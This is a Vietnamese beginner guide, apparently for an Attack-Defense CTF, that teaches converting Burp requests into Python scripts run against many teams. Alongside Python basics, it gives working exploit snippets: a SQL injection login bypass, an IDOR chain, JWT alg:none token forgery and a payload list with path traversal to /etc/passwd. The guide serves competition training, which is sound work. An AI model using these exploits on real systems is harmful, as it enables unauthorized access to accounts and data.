# Bắt đầu từ 0 — chưa biết Python, chưa biết khai thác web (hack web)

Đọc 1 lần trước ngày thi (15-20 phút). Sau bài này bạn sẽ hiểu đủ để đọc được mọi snippet trong các thư mục `01_` đến `08_` và tự sửa khi nó không chạy đúng.

Không cố nhớ hết — mục tiêu là **hiểu khái niệm**, vì các file khác sẽ có snippet copy-paste sẵn.

---

## 1. Vì sao phải chuyển từ Burp sang Python?

Trong thi Attack-Defense, bạn giải 1 lỗi trên **1 đội** bằng Burp (click chuột: Repeater, Intruder...). Nhưng có 10-20 đội khác cũng dính lỗi y hệt (vì cùng code). Bấm Burp cho từng đội là không kịp. Script Python làm đúng việc Burp đã làm, nhưng **lặp lại tự động cho tất cả đội trong vài giây**.

Vậy bản chất không có gì mới: **script Python chỉ là "ghi lại" đúng (các) request mà Burp đã gửi thành công, rồi lặp nó**.

**Lưu ý quan trọng — không phải bài nào cũng chỉ 1 request:**

- Nhiều bài cần **2-3 request nối tiếp** (login lấy cookie → lấy ID → dùng ID gửi request cuối). Đây không phải trường hợp đặc biệt, mà là **chuẩn**: xem mục 5 ở dưới (ví dụ 3 bước) và toàn bộ [`02_Chuoi_Request/`](02_Chuoi_Request/).
- Một số bài có bước **không phải gửi request HTTP** mà là tính toán cục bộ ngay trong Python: decode/giải mã 1 token, tính hash, brute-force 1 giá trị, hoặc gọi 1 tool ngoài — rồi **mới dùng kết quả đó** để gửi request. Xem [`02_Chuoi_Request/05_Tinh_Toan_Cuc_Bo.md`](02_Chuoi_Request/05_Tinh_Toan_Cuc_Bo.md).
- Một số bài dùng kênh khác không phải HTTP request/response thường (WebSocket) — xem [`03_Thao_Tac_Nang_Cao/04_WebSocket.md`](03_Thao_Tac_Nang_Cao/04_WebSocket.md).

Cách nhận biết: cứ **liệt kê đúng những bước tay bạn đã làm trên Burp/trình duyệt để ra flag**, theo thứ tự. Mỗi bước là 1 đoạn code trong `solve_one()`, theo đúng thứ tự đó — có bao nhiêu bước tay thì có bấy nhiêu đoạn code, không bắt phải gộp về 1 request.

---

## 2. Burp request map sang Python thế nào?

Một request bạn thấy trong tab Burp Repeater, ví dụ:

```
POST /api/login HTTP/1.1
Host: 10.0.2.1:8000
Content-Type: application/json
Cookie: session=abc123

{"username":"admin","password":"admin"}
```

4 phần trong request này map thẳng sang 4 thứ trong Python (dùng thư viện `requests`):

| Trong Burp | Trong Python |
|---|---|
| Dòng đầu `POST /api/login` | tên hàm `s.post(...)` + URL `"http://10.0.2.1:8000/api/login"` |
| Các dòng `Header: value` | tham số `headers={"Content-Type": "application/json"}` (Content-Type/Cookie thường để requests tự lo, xem bên dưới) |
| `Cookie: session=abc123` | không set tay — dùng `requests.Session()` để nó tự giữ cookie |
| Phần body `{"username":...}` | tham số `json={"username": "admin", "password": "admin"}` |

Viết lại bằng Python:

```python
import requests

s = requests.Session()                 # "session" giữ cookie xuyên suốt, giống việc Burp tự nhớ cookie giữa các tab
r = s.post(                             # gửi 1 request POST
    "http://10.0.2.1:8000/api/login",   # URL = Host + path trong Burp
    json={"username": "admin", "password": "admin"},  # body JSON; requests tự thêm Content-Type: application/json
    timeout=5,                          # bắt buộc có, không có thì script có thể treo vô hạn nếu server không trả lời
)
print(r.status_code)                    # mã trả về, ví dụ 200
print(r.text)                           # nội dung response, dạng chữ
```

Quy tắc đổi từ Burp sang Python, nhớ 5 dòng này:

- **Method + path + host** → URL đưa vào `s.get(url, ...)` / `s.post(url, ...)`.
- **Query string** (`?id=1&name=a`) → tham số `params={"id": "1", "name": "a"}`.
- **Body dạng `a=1&b=2`** (Content-Type: `application/x-www-form-urlencoded`) → `data={"a": "1", "b": "2"}`.
- **Body dạng JSON** (`{"a":1}`) → `json={"a": 1}`.
- **Cookie** → không set tay từng request, dùng chung 1 `requests.Session()` cho cả bài.

Chi tiết từng loại (GET, POST, header, cookie, upload, encode) có code mẫu đầy đủ trong [`01_Request_Co_Ban/`](01_Request_Co_Ban/).

---

## 3. Python tối thiểu cần biết — chỉ 10 khái niệm

Không cần học hết Python. Mọi snippet trong bộ cheatsheet này chỉ dùng 10 thứ sau.

### 3.1. Chạy 1 file Python

```bash
python ten_file.py
```

Nếu báo `python: command not found`, thử `python3 ten_file.py`.

### 3.2. Biến (variable) — chỗ chứa giá trị

```python
base = "http://10.0.2.1:8000"   # base là 1 biến kiểu chuỗi (string)
```

Không cần khai báo kiểu, không cần `;` ở cuối dòng.

### 3.3. Chuỗi (string) và f-string — cách ghép chuỗi hay dùng nhất

```python
base = "http://10.0.2.1:8000"
path = "/login"
url = f"{base}{path}"        # f"..." cho phép nhúng biến trong {}
print(url)                   # http://10.0.2.1:8000/login
```

`f"..."` là thứ bạn sẽ gõ nhiều nhất. Bất kỳ đâu có `{tên_biến}` trong chuỗi bắt đầu bằng `f`, Python sẽ thay bằng giá trị biến đó.

### 3.4. Dict (`{...}`) — danh sách "key: value", dùng cho header/body/json

```python
data = {"username": "admin", "password": "admin"}
print(data["username"])      # lấy giá trị theo key -> admin
```

Mọi `headers=`, `data=`, `json=`, `params=` trong các snippet đều là dict.

### 3.5. List (`[...]`) — danh sách nhiều giá trị

```python
teams = ["10.0.2.1", "10.0.3.1", "10.0.4.1"]
for t in teams:               # lặp qua từng phần tử
    print(t)
```

### 3.6. Vòng lặp `for`

```python
payloads = ["admin", "1' OR '1'='1", "../../etc/passwd"]
for p in payloads:
    print("thử:", p)
```

### 3.7. `if` / so sánh

```python
if r.status_code == 200:
    print("thành công")
elif r.status_code == 403:
    print("bị chặn (thường do WAF -- 1 lớp lọc tự động, thấy request khả nghi là chặn trước khi tới server thật)")
else:
    print("mã khác:", r.status_code)
```

### 3.8. Hàm (`def`) — gói 1 đoạn logic để gọi lại nhiều lần

```python
def solve_one(session, base_url):
    r = session.get(f"{base_url}/", timeout=5)
    return r.status_code

print(solve_one(requests.Session(), "http://10.0.2.1:8000"))
```

Tất cả snippet trong bộ này đều khuyên bạn dán code vào trong 1 hàm tên `solve_one(session, base_url)` (xem [`scripts/template.py`](scripts/template.py)) vì `template.py` sẽ tự gọi hàm này cho từng đội trong `targets.txt`.

### 3.9. `try` / `except` — bắt lỗi, không cho script dừng giữa đường

```python
try:
    data = r.json()           # có thể lỗi nếu response không phải JSON
except Exception as e:
    print("không parse được JSON:", e)
    data = None
```

Khi quét 10-20 đội, 1 đội lỗi không được làm script dừng toàn bộ — luôn bọc phần gửi request/parse response trong `try/except`.

### 3.10. `import` — nạp thư viện có sẵn

```python
import requests   # thư viện gửi HTTP request, phải cài trước: pip install requests
import re         # thư viện "regex" (tìm chuỗi theo 1 mẫu, ví dụ tìm đúng dạng flag trong 1 đoạn text dài); có sẵn trong Python, không cần cài
```

Lệnh cài thư viện (chạy 1 lần, cần làm **trước** ngày thi vì lúc thi không có Internet):

```bash
pip install requests beautifulsoup4
```

---

## 4. Lỗi cú pháp hay gặp nhất khi mới viết Python

Đây là nhóm lỗi **không liên quan gì tới web/exploit**, chỉ là gõ sai cú pháp Python — nhưng chiếm phần lớn thời gian debug của người mới. Đọc kỹ để tự sửa nhanh, không cần tra Google.

| Lỗi khi chạy | Nguyên nhân thật | Cách sửa |
|---|---|---|
| `IndentationError: expected an indented block` | Dòng sau `:` (sau `if`, `for`, `def`...) không lùi vào đủ khoảng trắng | Python dùng khoảng trắng đầu dòng để biết dòng nào "thuộc" khối nào — thụt vào đúng 4 dấu cách, nhất quán trong cả file |
| `SyntaxError: invalid syntax` ở cuối dòng `if`/`for`/`def` | Quên dấu `:` ở cuối dòng | Thêm `:`, ví dụ `if r.status_code == 200:` |
| `NameError: name 'r' is not defined` | Dùng biến `r` trước khi gán, hoặc gán ở dòng bên trong `try` nhưng lỗi xảy ra trước khi gán xong | In `r` ngay sau dòng gán để chắc nó tồn tại; kiểm tra thụt lề đúng hàm |
| `SyntaxError: f-string: single '}' is not allowed` | Trong f-string có dấu `{` hoặc `}` thật (ví dụ đang gõ JSON) nhưng Python lại hiểu nhầm đó là chỗ để nhúng biến | Gõ 2 dấu liền nhau `{{` và `}}` thay cho 1 dấu `{`/`}` thật, hoặc đổi sang chuỗi thường ghép bằng `+` |
| `ModuleNotFoundError: No module named 'requests'` | Thư viện chưa cài, hoặc cài ở Python khác với Python đang chạy | `pip install requests`; nếu vẫn lỗi, thử `pip3 install requests` hoặc `python -m pip install requests` |
| `TypeError: 'NoneType' object is not subscriptable` | Biến bằng `None` (ví dụ regex không match, `re.search(...)` trả `None`) mà vẫn gọi `.group()` hay `[...]` lên nó | Kiểm tra `if m:` trước khi dùng `m.group(...)` |
| `KeyError: 'token'` | Dict không có key đó (response JSON thực tế khác với bạn đoán) | `print(r.json())` để xem đúng cấu trúc thật trước khi lấy key |
| `json.decoder.JSONDecodeError` khi gọi `r.json()` | Response không phải JSON (có thể là trang lỗi HTML, hoặc bị 403 từ WAF) | `print(r.status_code, r.text[:300])` trước để biết server trả gì |
| Script chạy "treo", không in gì | Thiếu `timeout=`, server không phản hồi, bị chặn | Luôn thêm `timeout=5` (hoặc nhỏ hơn) vào mọi `s.get/s.post` |
| Python báo lỗi dòng cách xa dòng bạn sửa | Thường do thiếu `)`/`"`/`}` ở 1 dòng trước đó, Python chỉ báo lỗi khi "đọc hết" mới biết thiếu | Đếm số `(`/`)` và `{`/`}` phải cân nhau trong đoạn vừa sửa |

**Mẹo chung khi không chắc lỗi ở đâu**: in (`print(...)`) giá trị của biến **ngay trước** dòng báo lỗi. 90% lỗi lúc thi là do response không giống bạn tưởng (sai status, sai key JSON, bị WAF chặn) — không phải do Python khó.

---

## 5. Ví dụ đầy đủ: từ "giải tay trên Burp" đến "script chạy được"

### Ví dụ 1 — chuỗi 3 request (login → lấy ID → IDOR)

Giả sử bạn vừa giải tay 1 bài trên Burp, **3 bước**: (1) login bằng SQLi (chèn 1 đoạn lệnh giả vào ô username để database hiểu nhầm là lệnh thật) `admin'--`, (2) GET `/api/me` để lấy `user_id` của mình, (3) GET `/api/orders/{id}` với `id = user_id + 1` để đọc đơn hàng của người khác (gọi là IDOR — chỉ cần đổi số ID trong URL là xem được dữ liệu người khác, đúng ra server phải chặn việc này), trong đó có flag.

**Ghi lại chính xác 3 request đã chạy được trên Burp:**

```
POST /login HTTP/1.1
Host: 10.0.2.1:8000
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=x
```
```
GET /api/me HTTP/1.1
Host: 10.0.2.1:8000
Cookie: session=<cookie nhận được sau request trên>
```
```
GET /api/orders/43 HTTP/1.1
Host: 10.0.2.1:8000
Cookie: session=<cookie giữ nguyên>
```

**Viết thành script — mỗi request Burp phía trên là 1 đoạn trong `solve_one()`, giữ đúng thứ tự:**

```python
import re
import requests

def solve_one(session, base_url):
    # Request 1 trên Burp: POST /login, body form username=admin'--&password=x
    r1 = session.post(
        f"{base_url}/login",
        data={"username": "admin'--", "password": "x"},
        timeout=5,
    )
    if r1.status_code not in (200, 302):
        return None  # không login được, dừng sớm

    # Request 2 trên Burp: GET /api/me -- lấy user_id của chính mình
    # Không cần set Cookie tay vì `session` tự giữ cookie từ request 1
    r2 = session.get(f"{base_url}/api/me", timeout=5)
    try:
        my_id = r2.json()["id"]        # sửa key "id" theo đúng response thật
    except Exception:
        return None                    # không đọc được id, dừng, không đoán mò

    # Request 3 trên Burp: GET /api/orders/{id khác mình} -- đây là bước IDOR (xem mô tả phía trên)
    # id của request 3 LẤY TỪ KẾT QUẢ request 2, không gán cứng số 43 như lúc làm tay
    r3 = session.get(f"{base_url}/api/orders/{my_id + 1}", timeout=5)

    m = re.search(r"FHACKER2026\{[0-9a-fA-F]{64}\}", r3.text)
    return m.group(0) if m else None


if __name__ == "__main__":
    s = requests.Session()
    s.verify = False
    print("Flag:", solve_one(s, "http://10.0.2.1:8000"))
```

Chạy `python bai1.py`:
- In ra `Flag: FHACKER2026{...}` → copy `solve_one` vào [`scripts/template.py`](scripts/template.py).
- In ra `Flag: None` → thêm `print(r1.status_code, r2.status_code, r2.text[:200], r3.status_code, r3.text[:200])` để biết **request nào** sai trong 3 request, rồi so với Burp từng request đó — đừng đoán, in ra và nhìn.

Đây là quy trình chung: **có bao nhiêu request tay thì viết bấy nhiêu đoạn trong `solve_one()`, theo đúng thứ tự**, request sau lấy dữ liệu từ response của request trước (xem thêm [`02_Chuoi_Request/03_Truyen_ID_Giua_Cac_Buoc.md`](02_Chuoi_Request/03_Truyen_ID_Giua_Cac_Buoc.md)).

### Ví dụ 2 — có bước không phải request (tính toán cục bộ)

Không phải lúc nào mọi bước cũng là "gửi request". Ví dụ: cookie `session` là 1 JWT — hiểu đơn giản là "thẻ đăng nhập" dạng chữ, gồm 3 đoạn nối bằng dấu chấm (`phần1.phần2.phần3`): đoạn đầu ghi kiểu mã hoá, đoạn giữa ghi thông tin như vai trò (role), đoạn cuối là "con dấu" để chống bị sửa. Ở đây server quên kiểm con dấu khi đoạn đầu ghi "không mã hoá gì cả" (`alg: none`) — bạn đã test tay bằng cách tự sửa JWT (giải mã base64, đổi `"role":"user"` thành `"role":"admin"`, mã hoá lại, bỏ trống phần con dấu) rồi dán cookie mới vào Burp và request `/admin` thành công.

Bước "sửa JWT" này **không gửi request nào cả** — nó là xử lý chuỗi thuần Python, chèn vào **giữa** 2 request:

```python
import base64
import json
import requests

def b64url_encode(data: dict) -> str:
    raw = json.dumps(data, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

def solve_one(session, base_url):
    # Request 1: lấy JWT ban đầu (vai user thường)
    r1 = session.post(f"{base_url}/login", data={"username": "user", "password": "user"}, timeout=5)
    token = session.cookies.get("session")
    if not token:
        return None

    # --- Bước tính toán cục bộ, KHÔNG có request nào ở đây ---
    header_b64, payload_b64, _con_dau_cu = token.split(".")   # cắt token thành 3 đoạn theo dấu chấm
    new_header = b64url_encode({"alg": "none", "typ": "JWT"})  # đoạn đầu: khai "không mã hoá"
    payload = json.loads(base64.urlsafe_b64decode(payload_b64 + "=="))
    payload["role"] = "admin"               # sửa thông tin vai trò ngay trong Python, không qua Burp nữa
    new_payload = b64url_encode(payload)
    forged_token = f"{new_header}.{new_payload}."   # alg=none -> bỏ trống đoạn "con dấu" cuối
    # --- Hết bước tính toán, giờ mới gửi request tiếp ---

    session.cookies.set("session", forged_token)
    r2 = session.get(f"{base_url}/admin", timeout=5)
    return r2.text if "FHACKER2026{" in r2.text else None
```

Dạng bước cục bộ này (decode/encode token, tính hash, brute-force giá trị, gọi tool ngoài) gặp nhiều ở bài JWT/crypto — xem chi tiết và thêm ví dụ ở [`02_Chuoi_Request/05_Tinh_Toan_Cuc_Bo.md`](02_Chuoi_Request/05_Tinh_Toan_Cuc_Bo.md).

---

## 6. Đi tiếp từ đây

- Loại request cụ thể (GET/POST/header/cookie/upload/encode): [`01_Request_Co_Ban/`](01_Request_Co_Ban/)
- Login giữ phiên, lấy CSRF token, truyền ID giữa các bước, đọc response, tính toán cục bộ giữa 2 request: [`02_Chuoi_Request/`](02_Chuoi_Request/)
- Lặp nhiều đội, song song, polling, WebSocket: [`03_Thao_Tac_Nang_Cao/`](03_Thao_Tac_Nang_Cao/)
- Payload theo từng loại lỗ hổng (SQLi, IDOR, LFI, SSTI, SSRF...): [`04_Theo_Lo_Hong/`](04_Theo_Lo_Hong/)
- Script bị lỗi, Burp chạy được mà Python không: [`06_Debug/`](06_Debug/)
- Mục lục tra cứu nhanh khi đang thi: [`CHEATSHEET_NHANH.md`](CHEATSHEET_NHANH.md)
